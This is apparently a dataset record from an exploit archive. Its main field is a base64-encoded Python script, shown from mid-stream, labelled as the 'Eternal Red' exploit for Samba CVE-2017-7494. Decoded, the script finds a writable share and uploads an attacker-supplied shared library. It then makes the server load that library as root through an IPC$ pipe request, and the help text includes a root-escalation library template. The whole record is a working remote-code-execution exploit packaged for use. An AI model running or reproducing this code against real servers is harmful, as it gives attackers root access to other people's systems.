ZWN0IHRvIElQQyQnLCBtZXNzYWdlc19oaXN0b3J5KSkNCg0KICAgICAgICAgICAgbSA9IFNNQjJNZXNzYWdlKFNNQjJUcmVlQ29ubmVjdFJlcXVlc3QocidcXCVzXCVzJyAlICggc2VsZi5yZW1vdGVfbmFtZS51cHBlcigpLCBwYXRoICkpKQ0KICAgICAgICAgICAgc2VsZi5fc2VuZFNNQk1lc3NhZ2UobSkNCiAgICAgICAgICAgIHNlbGYucGVuZGluZ19yZXF1ZXN0c1ttLm1pZF0gPSBfUGVuZGluZ1JlcXVlc3QobS5taWQsIGV4cGlyeV90aW1lLCBjb25uZWN0Q0IsIGVycmJhY2ssIHBhdGggPSBwYXRoKQ0KICAgICAgICAgICAgbWVzc2FnZXNfaGlzdG9yeS5hcHBlbmQobSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGNvbm5lY3RTcnZTdmMoc2VsZi5jb25uZWN0ZWRfdHJlZXNbcGF0aF0pDQoNCg0KICAgICMgRG9uJ3QgY29udmVydCB0byBXaW5kb3cgc3R5bGUgcGF0aA0KICAgIGRlZiBfcmV0cmlldmVGaWxlRnJvbU9mZnNldF9TTUIxVW5peChzZWxmLCBzZXJ2aWNlX25hbWUsIHBhdGgsIGZpbGVfb2JqLCBjYWxsYmFjaywgZXJyYmFjaywgc3RhcnRpbmdfb2Zmc2V0LCBtYXhfbGVuZ3RoLCB0aW1lb3V0ID0gMzApOg0KICAgICAgICBpZiBub3Qgc2VsZi5oYXNfYXV0aGVudGljYXRlZDoNCiAgICAgICAgICAgIHJhaXNlIE5vdFJlYWR5RXJyb3IoJ1NNQiBjb25uZWN0aW9uIG5vdCBhdXRoZW50aWNhdGVkJykNCg0KICAgICAgICBtZXNzYWdlc19oaXN0b3J5ID0gWyBdDQoNCg0KICAgICAgICBkZWYgc2VuZE9wZW4odGlkKToNCiAgICAgICAgICAgIG0gPSBTTUJNZXNzYWdlKENvbU9wZW5BbmR4UmVxdWVzdChmaWxlbmFtZSA9IHBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWNjZXNzX21vZGUgPSAweDAwNDAsICAjIFNoYXJpbmcgbW9kZTogRGVueSBub3RoaW5nIHRvIG90aGVycw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZW5fbW9kZSA9IDB4MDAwMSwgICAgIyBGYWlsZWQgaWYgZmlsZSBkb2VzIG5vdCBleGlzdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlYXJjaF9hdHRyaWJ1dGVzID0gU01CX0ZJTEVfQVRUUklCVVRFX0hJRERFTiB8IFNNQl9GSUxFX0FUVFJJQlVURV9TWVNURU0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZW91dCA9IHRpbWVvdXQgKiAxMDAwKSkNCiAgICAgICAgICAgIG0udGlkID0gdGlkDQogICAgICAgICAgICBzZWxmLl9zZW5kU01CTWVzc2FnZShtKQ0KICAgICAgICAgICAgc2VsZi5wZW5kaW5nX3JlcXVlc3RzW20ubWlkXSA9IF9QZW5kaW5nUmVxdWVzdChtLm1pZCwgaW50KHRpbWUudGltZSgpKSArIHRpbWVvdXQsIG9wZW5DQiwgZXJyYmFjaykNCiAgICAgICAgICAgIG1lc3NhZ2VzX2hpc3RvcnkuYXBwZW5kKG0pDQoNCiAgICAgICAgZGVmIG9wZW5DQihvcGVuX21lc3NhZ2UsICoqa3dhcmdzKToNCiAgICAgICAgICAgIG1lc3NhZ2VzX2hpc3RvcnkuYXBwZW5kKG9wZW5fbWVzc2FnZSkNCiAgICAgICAgICAgIGlmIG5vdCBvcGVuX21lc3NhZ2Uuc3RhdHVzLmhhc0Vycm9yOg0KICAgICAgICAgICAgICAgIGlmIG1heF9sZW5ndGggPT0gMDoNCiAgICAgICAgICAgICAgICAgICAgY2xvc2VGaWQob3Blbl9tZXNzYWdlLnRpZCwgb3Blbl9tZXNzYWdlLnBheWxvYWQuZmlkKQ0KICAgICAgICAgICAgICAgICAgICBjYWxsYmFjaygoIGZpbGVfb2JqLCBvcGVuX21lc3NhZ2UucGF5bG9hZC5maWxlX2F0dHJpYnV0ZXMsIDAgKSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBzZW5kUmVhZChvcGVuX21lc3NhZ2UudGlkLCBvcGVuX21lc3NhZ2UucGF5bG9hZC5maWQsIHN0YXJ0aW5nX29mZnNldCwgb3Blbl9tZXNzYWdlLnBheWxvYWQuZmlsZV9hdHRyaWJ1dGVzLCAwLCBtYXhfbGVuZ3RoKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBlcnJiYWNrKE9wZXJhdGlvbkZhaWx1cmUoJ0ZhaWxlZCB0byByZXRyaWV2ZSAlcyBvbiAlczogVW5hYmxlIHRvIG9wZW4gZmlsZScgJSAoIHBhdGgsIHNlcnZpY2VfbmFtZSApLCBtZXNzYWdlc19oaXN0b3J5KSkNCg0KICAgICAgICBkZWYgc2VuZFJlYWQodGlkLCBmaWQsIG9mZnNldCwgZmlsZV9hdHRyaWJ1dGVzLCByZWFkX2xlbiwgcmVtYWluaW5nX2xlbik6DQogICAgICAgICAgICByZWFkX2NvdW50ID0gc2VsZi5tYXhfcmF3X3NpemUgLSAyDQogICAgICAgICAgICBtID0gU01CTWVzc2FnZShDb21SZWFkQW5keFJlcXVlc3QoZmlkID0gZmlkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9mZnNldCA9IG9mZnNldCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXhfcmV0dXJuX2J5dGVzX2NvdW50ID0gcmVhZF9jb3VudCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtaW5fcmV0dXJuX2J5dGVzX2NvdW50ID0gbWluKDB4RkZGRiwgcmVhZF9jb3VudCkpKQ0KICAgICAgICAgICAgbS50aWQgPSB0aWQNCiAgICAgICAgICAgIHNlbGYuX3NlbmRTTUJNZXNzYWdlKG0pDQogICAgICAgICAgICBzZWxmLnBlbmRpbmdfcmVxdWVzdHNbbS5taWRdID0gX1BlbmRpbmdSZXF1ZXN0KG0ubWlkLCBpbnQodGltZS50aW1lKCkpICsgdGltZW91dCwgcmVhZENCLCBlcnJiYWNrLCBmaWQgPSBmaWQsIG9mZnNldCA9IG9mZnNldCwgZmlsZV9hdHRyaWJ1dGVzID0gZmlsZV9hdHRyaWJ1dGVzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWFkX2xlbiA9IHJlYWRfbGVuLCByZW1haW5pbmdfbGVuID0gcmVtYWluaW5nX2xlbikNCg0KICAgICAgICBkZWYgcmVhZENCKHJlYWRfbWVzc2FnZSwgKiprd2FyZ3MpOg0KICAgICAgICAgICAgIyBUbyBhdm9pZCBjcmF6eSBtZW1vcnkgdXNhZ2Ugd2hlbiByZXRyaWV2aW5nIGxhcmdlIGZpbGVzLCB3ZSBkbyBub3Qgc2F2ZSBldmVyeSByZWFkX21lc3NhZ2UgaW4gbWVzc2FnZXNfaGlzdG9yeS4NCiAgICAgICAgICAgIGlmIG5vdCByZWFkX21lc3NhZ2Uuc3RhdHVzLmhhc0Vycm9yOg0KICAgICAgICAgICAgICAgIHJlYWRfbGVuID0ga3dhcmdzWydyZWFkX2xlbiddDQogICAgICAgICAgICAgICAgcmVtYWluaW5nX2xlbiA9IGt3YXJnc1sncmVtYWluaW5nX2xlbiddDQogICAgICAgICAgICAgICAgZGF0YV9sZW4gPSByZWFkX21lc3NhZ2UucGF5bG9hZC5kYXRhX2xlbmd0aA0KICAgICAgICAgICAgICAgIGlmIG1heF9sZW5ndGggPiAwOg0KICAgICAgICAgICAgICAgICAgICBpZiBkYXRhX2xlbiA+IHJlbWFpbmluZ19sZW46DQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlX29iai53cml0ZShyZWFkX21lc3NhZ2UucGF5bG9hZC5kYXRhWzpyZW1haW5pbmdfbGVuXSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlYWRfbGVuICs9IHJlbWFpbmluZ19sZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIHJlbWFpbmluZ19sZW4gPSAwDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlX29iai53cml0ZShyZWFkX21lc3NhZ2UucGF5bG9hZC5kYXRhKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcmVtYWluaW5nX2xlbiAtPSBkYXRhX2xlbg0KICAgICAgICAgICAgICAgICAgICAgICAgcmVhZF9sZW4gKz0gZGF0YV9sZW4NCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBmaWxlX29iai53cml0ZShyZWFkX21lc3NhZ2UucGF5bG9hZC5kYXRhKQ0KICAgICAgICAgICAgICAgICAgICByZWFkX2xlbiArPSBkYXRhX2xlbg0KDQogICAgICAgICAgICAgICAgaWYgKG1heF9sZW5ndGggPiAwIGFuZCByZW1haW5pbmdfbGVuIDw9IDApIG9yIGRhdGFfbGVuIDwgKHNlbGYubWF4X3Jhd19zaXplIC0gMik6DQogICAgICAgICAgICAgICAgICAgIGNsb3NlRmlkKHJlYWRfbWVzc2FnZS50aWQsIGt3YXJnc1snZmlkJ10pDQogICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKCggZmlsZV9vYmosIGt3YXJnc1snZmlsZV9hdHRyaWJ1dGVzJ10sIHJlYWRfbGVuICkpICAjIE5vdGUgdGhhdCB0aGlzIGlzIGEgdHVwbGUgb2YgMy1lbGVtZW50cw0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIHNlbmRSZWFkKHJlYWRfbWVzc2FnZS50aWQsIGt3YXJnc1snZmlkJ10sIGt3YXJnc1snb2Zmc2V0J10rZGF0YV9sZW4sIGt3YXJnc1snZmlsZV9hdHRyaWJ1dGVzJ10sIHJlYWRfbGVuLCByZW1haW5pbmdfbGVuKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBtZXNzYWdlc19oaXN0b3J5LmFwcGVuZChyZWFkX21lc3NhZ2UpDQogICAgICAgICAgICAgICAgY2xvc2VGaWQocmVhZF9tZXNzYWdlLnRpZCwga3dhcmdzWydmaWQnXSkNCiAgICAgICAgICAgICAgICBlcnJiYWNrKE9wZXJhdGlvbkZhaWx1cmUoJ0ZhaWxlZCB0byByZXRyaWV2ZSAlcyBvbiAlczogUmVhZCBmYWlsZWQnICUgKCBwYXRoLCBzZXJ2aWNlX25hbWUgKSwgbWVzc2FnZXNfaGlzdG9yeSkpDQoNCiAgICAgICAgZGVmIGNsb3NlRmlkKHRpZCwgZmlkKToNCiAgICAgICAgICAgIG0gPSBTTUJNZXNzYWdlKENvbUNsb3NlUmVxdWVzdChmaWQpKQ0KICAgICAgICAgICAgbS50aWQgPSB0aWQNCiAgICAgICAgICAgIHNlbGYuX3NlbmRTTUJNZXNzYWdlKG0pDQogICAgICAgICAgICBtZXNzYWdlc19oaXN0b3J5LmFwcGVuZChtKQ0KDQogICAgICAgIGlmIHNlcnZpY2VfbmFtZSBub3QgaW4gc2VsZi5jb25uZWN0ZWRfdHJlZXM6DQogICAgICAgICAgICBkZWYgY29ubmVjdENCKGNvbm5lY3RfbWVzc2FnZSwgKiprd2FyZ3MpOg0KICAgICAgICAgICAgICAgIG1lc3NhZ2VzX2hpc3RvcnkuYXBwZW5kKGNvbm5lY3RfbWVzc2FnZSkNCiAgICAgICAgICAgICAgICBpZiBub3QgY29ubmVjdF9tZXNzYWdlLnN0YXR1cy5oYXNFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5jb25uZWN0ZWRfdHJlZXNbc2VydmljZV9uYW1lXSA9IGNvbm5lY3RfbWVzc2FnZS50aWQNCiAgICAgICAgICAgICAgICAgICAgc2VuZE9wZW4oY29ubmVjdF9tZXNzYWdlLnRpZCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBlcnJiYWNrKE9wZXJhdGlvbkZhaWx1cmUoJ0ZhaWxlZCB0byByZXRyaWV2ZSAlcyBvbiAlczogVW5hYmxlIHRvIGNvbm5lY3QgdG8gc2hhcmVkIGRldmljZScgJSAoIHBhdGgsIHNlcnZpY2VfbmFtZSApLCBtZXNzYWdlc19oaXN0b3J5KSkNCg0KICAgICAgICAgICAgbSA9IFNNQk1lc3NhZ2UoQ29tVHJlZUNvbm5lY3RBbmR4UmVxdWVzdChyJ1xcJXNcJXMnICUgKCBzZWxmLnJlbW90ZV9uYW1lLnVwcGVyKCksIHNlcnZpY2VfbmFtZSApLCBTRVJWSUNFX0FOWSwgJycpKQ0KICAgICAgICAgICAgc2VsZi5fc2VuZFNNQk1lc3NhZ2UobSkNCiAgICAgICAgICAgIHNlbGYucGVuZGluZ19yZXF1ZXN0c1ttLm1pZF0gPSBfUGVuZGluZ1JlcXVlc3QobS5taWQsIGludCh0aW1lLnRpbWUoKSkgKyB0aW1lb3V0LCBjb25uZWN0Q0IsIGVycmJhY2ssIHBhdGggPSBzZXJ2aWNlX25hbWUpDQogICAgICAgICAgICBtZXNzYWdlc19oaXN0b3J5LmFwcGVuZChtKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgc2VuZE9wZW4oc2VsZi5jb25uZWN0ZWRfdHJlZXNbc2VydmljZV9uYW1lXSkNCg0KZGVmIGdldF9jb25uZWN0aW9uKHVzZXIsIHBhc3N3b3JkLCBzZXJ2ZXIsIHBvcnQsIGZvcmNlX3NtYjE9RmFsc2UpOg0KICAgIGlmIGZvcmNlX3NtYjE6DQogICAgICAgIHNtYl9zdHJ1Y3RzLlNVUFBPUlRfU01CMiA9IEZhbHNlDQoNCiAgICBjb25uID0gU01CQ29ubmVjdGlvbkV4KHVzZXIsIHBhc3N3b3JkLCAiIiwgInNlcnZlciIpDQogICAgYXNzZXJ0IGNvbm4uY29ubmVjdChzZXJ2ZXIsIHBvcnQpDQogICAgcmV0dXJuIGNvbm4NCg0KZGVmIGdldF9zaGFyZV9pbmZvKGNvbm4pOg0KICAgIGNvbm4uaG9va19saXN0U2hhcmVzKCkNCiAgICByZXR1cm4gY29ubi5saXN0U2hhcmVzKCkNCg0KZGVmIGZpbmRfd3JpdGVhYmxlX3NoYXJlKGNvbm4sIHNoYXJlcyk6DQogICAgcHJpbnQoIlsrXSBTZWFyY2hpbmcgZm9yIHdyaXRhYmxlIHNoYXJlIikNCiAgICBmaWxlbmFtZSA9ICJyZWQiDQogICAgdGVzdF9maWxlID0gdGVtcGZpbGUuVGVtcG9yYXJ5RmlsZSgpDQogICAgZm9yIHNoYXJlIGluIHNoYXJlczoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgIyBJZiBpdCdzIG5vdCB3cml0ZWFibGUgdGhpcyB3aWxsIHRocm93DQogICAgICAgICAgICBjb25uLnN0b3JlRmlsZShzaGFyZS5uYW1lLCBmaWxlbmFtZSwgdGVzdF9maWxlKQ0KICAgICAgICAgICAgY29ubi5kZWxldGVGaWxlcyhzaGFyZS5uYW1lLCBmaWxlbmFtZSkNCiAgICAgICAgICAgIHByaW50KCJbK10gRm91bmQgd3JpdGVhYmxlIHNoYXJlOiAiICsgc2hhcmUubmFtZSkNCiAgICAgICAgICAgIHJldHVybiBzaGFyZQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCiAgICByZXR1cm4gTm9uZQ0KDQpkZWYgd3JpdGVfcGF5bG9hZChjb25uLCBzaGFyZSwgcGF5bG9hZCwgcGF5bG9hZF9uYW1lKToNCiAgICB3aXRoIG9wZW4ocGF5bG9hZCwgInJiIikgYXMgZmluOg0KICAgICAgICBjb25uLnN0b3JlRmlsZShzaGFyZS5uYW1lLCBwYXlsb2FkX25hbWUsIGZpbikNCg0KICAgIHJldHVybiBUcnVlDQoNCmRlZiBjb252ZXJ0X3NoYXJlX3BhdGgoc2hhcmUpOg0KICAgIHBhdGggPSBzaGFyZS5wYXRoWzI6XQ0KICAgIHBhdGggPSBwYXRoLnJlcGxhY2UoIlxcIiwgIi8iKQ0KICAgIHJldHVybiBwYXRoDQoNCmRlZiBsb2FkX3BheWxvYWQodXNlciwgcGFzc3dvcmQsIHNlcnZlciwgcG9ydCwgZnVsbHBhdGgpOg0KICAgIGNvbm4gPSBnZXRfY29ubmVjdGlvbih1c2VyLCBwYXNzd29yZCwgc2VydmVyLCBwb3J0LCBmb3JjZV9zbWIxID0gVHJ1ZSkNCiAgICBjb25uLmhvb2tfcmV0cmlldmVGaWxlKCkNCg0KICAgIHByaW50KCJbK10gQXR0ZW1wdGluZyB0byBsb2FkIHBheWxvYWQiKQ0KICAgIHRlbXBfZmlsZSA9IHRlbXBmaWxlLlRlbXBvcmFyeUZpbGUoKQ0KDQogICAgdHJ5Og0KICAgICAgICBjb25uLnJldHJpZXZlRmlsZSgiSVBDJCIsICJcXFxcUElQRVxcIiArIGZ1bGxwYXRoLCB0ZW1wX2ZpbGUpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQoNCiAgICByZXR1cm4NCg0KZGVmIGRyb3BfcGF5bG9hZCh1c2VyLCBwYXNzd29yZCwgc2VydmVyLCBwb3J0LCBwYXlsb2FkKToNCiAgICBwYXlsb2FkX25hbWUgPSAiY2hhcml6YXJkIg0KDQogICAgY29ubiA9IGdldF9jb25uZWN0aW9uKHVzZXIsIHBhc3N3b3JkLCBzZXJ2ZXIsIHBvcnQpDQogICAgc2hhcmVzID0gZ2V0X3NoYXJlX2luZm8oY29ubikNCiAgICBzaGFyZSA9IGZpbmRfd3JpdGVhYmxlX3NoYXJlKGNvbm4sIHNoYXJlcykNCg0KICAgIGlmIHNoYXJlIGlzIE5vbmU6DQogICAgICAgIHByaW50KCJbIV0gTm8gd3JpdGVhYmxlIHNoYXJlcyBvbiAiICsgc2VydmVyICsgIiBmb3IgdXNlcjogIiArIHVzZXIpDQogICAgICAgIHN5cy5leGl0KC0xKQ0KDQogICAgaWYgbm90IHdyaXRlX3BheWxvYWQoY29ubiwgc2hhcmUsIHBheWxvYWQsIHBheWxvYWRfbmFtZSk6DQogICAgICAgIHByaW50KCJbIV0gRmFpbGVkIHRvIHdyaXRlIHBheWxvYWQ6ICIgKyBzdHIocGF5bG9hZCkgKyAiIHRvIHNlcnZlciIpDQogICAgICAgIHN5cy5leGl0KC0xKQ0KDQogICAgY29ubi5jbG9zZSgpDQoNCiAgICBmdWxscGF0aCA9IGNvbnZlcnRfc2hhcmVfcGF0aChzaGFyZSkNCiAgICByZXR1cm4gb3MucGF0aC5qb2luKGZ1bGxwYXRoLCBwYXlsb2FkX25hbWUpDQoNCg0KZGVmIG1haW4oKToNCiAgICBwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcihmb3JtYXR0ZXJfY2xhc3M9YXJncGFyc2UuUmF3RGVzY3JpcHRpb25IZWxwRm9ybWF0dGVyLA0KICAgIGRlc2NyaXB0aW9uPSAiIiJFdGVybmFsIFJlZCBTYW1iYSBFeHBsb2l0IC0tIENWRS0yMDE3LTc0OTQNCiAgICAgICAgQ2F1c2VzIHZ1bG5lcmFibGUgU2FtYmEgc2VydmVyIHRvIGxvYWQgYSBzaGFyZWQgbGlicmFyeSBpbiByb290IGNvbnRleHQNCiAgICAgICAgQ3JlZGVudGlhbHMgYXJlIG5vdCByZXF1aXJlZCBpZiB0aGUgc2VydmVyIGhhcyBhIGd1ZXN0IGFjY291bnQNCiAgICAgICAgRm9yIHJlbW90ZSBleHBsb2l0IHlvdSBtdXN0IGhhdmUgd3JpdGUgcGVybWlzc2lvbnMgdG8gYXQgbGVhc3Qgb25lIHNoYXJlDQogICAgICAgIEV0ZXJuYWwgUmVkIHdpbGwgc2NhbiB0aGUgU2FtYmEgc2VydmVyIGZvciBzaGFyZXMgaXQgY2FuIHdyaXRlIHRvDQogICAgICAgIEl0IHdpbGwgYWxzbyBkZXRlcm1pbmUgdGhlIGZ1bGxwYXRoIG9mIHRoZSByZW1vdGUgc2hhcmUNCg0KICAgICAgICBGb3IgbG9jYWwgZXhwbG9pdCBwcm92aWRlIHRoZSBmdWxsIHBhdGggdG8geW91ciBzaGFyZWQgbGlicmFyeSB0byBsb2FkDQoNCiAgICAgICAgWW91ciBzaGFyZWQgbGlicmFyeSBzaG91bGQgbG9vayBzb21ldGhpbmcgbGlrZSB0aGlzDQoNCiAgICAgICAgZXh0ZXJuIGJvb2wgY2hhbmdlX3RvX3Jvb3RfdXNlcih2b2lkKTsNCiAgICAgICAgaW50IHNhbWJhX2luaXRfbW9kdWxlKHZvaWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGNoYW5nZV90b19yb290X3VzZXIoKTsNCiAgICAgICAgICAgIC8qIERvIHdoYXQgdGhvdSB3aWx0ICovDQogICAgICAgIH0NCiAgICAiIiIpDQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgicGF5bG9hZCIsIGhlbHA9InBhdGggdG8gc2hhcmVkIGxpYnJhcnkgdG8gbG9hZCIsIHR5cGU9c3RyKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoInNlcnZlciIsIGhlbHA9IlNlcnZlciB0byB0YXJnZXQiLCB0eXBlPXN0cikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItcCIsICItLXBvcnQiLCBoZWxwPSJQb3J0IHRvIHVzZSBkZWZhdWx0cyB0byA0NDUiLCB0eXBlPWludCkNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItdSIsICItLXVzZXJuYW1lIiwgaGVscD0iVXNlcm5hbWUgdG8gY29ubmVjdCBhcyBkZWZhdWx0cyB0byBub2JvZHkiLCB0eXBlPXN0cikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItLXBhc3N3b3JkIiwgaGVscD0iUGFzc3dvcmQgZm9yIHVzZXIgZGVmYXVsdCBpcyBlbXB0eSIsIHR5cGU9c3RyKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoIi0tbG9jYWwiLCBoZWxwPSJQZXJmb3JtIGxvY2FsIGF0dGFjay4gUGF5bG9hZCBzaG91bGQgYmUgZnVsbHBhdGghIiwgdHlwZT1ib29sKQ0KICAgIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpDQoNCiAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoYXJncy5wYXlsb2FkKToNCiAgICAgICAgcHJpbnQoIlshXSBVbmFibGUgdG8gb3BlbjogIiArIGFyZ3MucGF5bG9hZCkNCiAgICAgICAgc3lzLmV4aXQoLTEpDQoNCiAgICBwb3J0ID0gNDQ1DQogICAgdXNlciA9ICJub2JvZHkiDQogICAgcGFzc3dvcmQgPSAiIg0KICAgIGZ1bGxwYXRoID0gIiINCg0KICAgIGlmIGFyZ3MucG9ydDoNCiAgICAgICAgcG9ydCA9IGFyZ3MucG9ydA0KICAgIGlmIGFyZ3MudXNlcm5hbWU6DQogICAgICAgIHVzZXIgPSBhcmdzLnVzZXJuYW1lDQogICAgaWYgYXJncy5wYXNzd29yZDoNCiAgICAgICAgcGFzc3dvcmQgPSBhcmdzLnBhc3N3b3JkDQoNCiAgICBpZiBhcmdzLmxvY2FsOg0KICAgICAgICBmdWxscGF0aCA9IGFyZ3MucGF5bG9hZA0KICAgIGVsc2U6DQogICAgICAgIGZ1bGxwYXRoID0gZHJvcF9wYXlsb2FkKHVzZXIsIHBhc3N3b3JkLCBhcmdzLnNlcnZlciwgcG9ydCwgYXJncy5wYXlsb2FkKQ0KDQogICAgbG9hZF9wYXlsb2FkKHVzZXIsIHBhc3N3b3JkLCBhcmdzLnNlcnZlciwgcG9ydCwgZnVsbHBhdGgpDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigp", 
    "filename": "platforms/linux/remote/42060.py", 
    "id": "42060", 
    "cves": [
        "CVE-2017-7494"
    ]
}